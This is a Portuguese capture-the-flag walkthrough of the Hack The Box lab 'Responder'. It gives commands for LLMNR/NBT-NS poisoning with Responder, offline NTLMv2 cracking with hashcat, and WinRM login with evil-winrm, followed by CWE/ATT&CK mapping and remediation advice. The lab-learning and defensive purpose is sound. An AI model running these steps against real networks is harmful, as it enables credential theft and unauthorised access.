# HTB Starting Point — Responder

| Campo | Detalhe |
|---|---|
| SO | Windows |
| Dificuldade | Fácil |
| Categoria | Envenenamento LLMNR/NBT-NS, Captura e Quebra de Hash NTLM |
| Ferramentas | Responder, Hashcat, Evil-WinRM |

## Recon

```
rustscan -a <TARGET_IP> -- -sV -sC
```

Resultado: serviços Windows típicos (SMB, WinRM) expostos; ambiente vulnerável a resolução de nomes insegura (LLMNR/NBT-NS habilitados).

## Exploração

1. Inicialização do listener Responder na interface de rede do atacante:

```
responder -I <interface>
```

2. Ao ocorrer uma falha de resolução de nome na rede (ex.: acesso a um compartilhamento inexistente), a máquina-alvo envia broadcast LLMNR/NBT-NS, capturado pelo Responder, que retorna um hash NTLMv2 do usuário.

3. Quebra do hash offline:

```
hashcat -m 5600 hash.txt rockyou.txt
```

4. Com a senha em texto claro, acesso remoto via WinRM:

```
evil-winrm -i <TARGET_IP> -u <usuario> -p <senha>
```

Flag capturada na sessão remota.

## Mapeamento OWASP/CWE

- **CWE-300** (Channel Accessible by Non-Endpoint) — protocolos de resolução de nome legados sujeitos a spoofing
- Mapeado em **MITRE ATT&CK T1557.001** (Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning)

## Remediação

- Desabilitar LLMNR e NBT-NS via GPO em toda a rede
- Aplicar SMB signing obrigatório
- Monitorar e alertar sobre tráfego de broadcast anômalo na rede
